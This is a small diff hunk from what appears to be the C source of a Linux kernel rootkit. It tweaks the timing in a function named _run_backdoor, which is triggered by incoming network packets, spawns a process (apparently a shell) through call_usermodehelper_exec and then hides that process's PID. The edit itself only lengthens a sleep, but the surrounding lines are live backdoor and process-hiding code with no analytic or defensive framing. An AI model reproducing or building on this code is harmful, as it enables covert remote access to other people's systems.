@@ -273,9 +273,10 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
 		ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
 	}
 
+
 	// wait a little while before the
 	// children are ready and inform about new parent PID
-	msleep(100);
+	msleep(300);
 
 	if (!ret) {
 		kv_hide_task_by_pid(shellpid, saddr, WHATEVER);
